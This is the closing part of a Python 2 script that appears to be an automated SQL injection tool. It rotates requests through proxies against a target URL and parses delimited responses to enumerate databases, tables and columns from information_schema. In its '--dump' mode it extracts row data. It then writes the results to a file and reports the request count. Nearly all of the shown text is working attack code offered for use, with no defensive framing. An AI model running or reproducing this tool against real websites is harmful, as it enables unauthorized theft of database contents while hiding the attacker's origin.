                        		file.write("\n["+str(num)+"]"+str(match))
                       			print "["+str(num)+"]",match
					table_num = int(table_num) + 1
				#Collect data from tables & columns
				elif mode == "--dump":
                                        match = re.findall("\x1e\x1e+[\w\d\?\/\_\:\.\=\s\S\-+]+\x1e\x1e",source)
					match = match[0].strip("\x1e").split("\x1e")
					if arg_verbose == 1:
                                                print "\n["+str(num)+"] ",
                                                file.write("\n["+str(num)+"] ",)
                                        else:
                                                print 
                                                file.write("\n")
					for ddata in match:
                                                if ddata == "":
                                                        ddata = "NoDataInColumn"
                                                sys.stdout.write("%s:" % (ddata))
                                                file.write("%s:" % ddata)
                                                sys.stdout.flush()
                                        table_num = int(table_num) + 1
			else:
				if mode == "--dump":
                                        sys.stdout.write("\n[%s] No data" % (num))
                                        file.write("%s:" % ddata)
                                        table_num = int(table_num) + 1
                                else:
                                        break
			num = int(num) + 1
		except (KeyboardInterrupt, SystemExit):
			raise
		except:
			pass

#Full SQLi information_schema Enumeration
if mode == "--full":
        while 1:
                try:                        
                        proxy_num+=1
                        gets+=1
                        source = proxy_list[proxy_num % proxy_len].open(line_URL.replace("NUM",str(num))).read() 
                        match = re.findall("\x1e\x1e\S+",source)
                        if len(match) >= 1:
                                match = match[0][2:].split("\x1e")
                                if cur_db != match[0]:			
                                        cur_db = match[0]
                                        file.write("\n\n[Database]: "+match[0]+"\n")
                                        print "\n\n[Database]: "+match[0]
                                        print "[Table: Columns]"
                                        file.write("[Table: Columns]")
                                        table_num=0
                                if cur_table != match[1]:
                                        print "\n["+str(table_num)+"]"+match[1]+": "+match[2],
                                        file.write("\n["+str(table_num)+"]"+match[1]+": "+match[2])
                                        cur_table = match[1]
                                        table_num = int(table_num) + 1
                                else:
                                        sys.stdout.write(",%s" % (match[2]))
                                        file.write(","+match[2])
                                        sys.stdout.flush()
                        else:
                                if num == 0:
                                        print "\n[-] No Data Found"
                                break
                        num = int(num) + 1
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass

#Lets wrap it up!
if mode == "--schema" or mode == "--full" or mode == "--dump":
        print ""
print "\n[-] %s" % time.strftime("%X")
print "[-] Total URL Requests",gets
file.write("\n\n[-] [%s]" % time.strftime("%X"))
file.write("\n[-] Total URL Requests "+str(gets))
print "[-] Done\n"
file.write("\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()
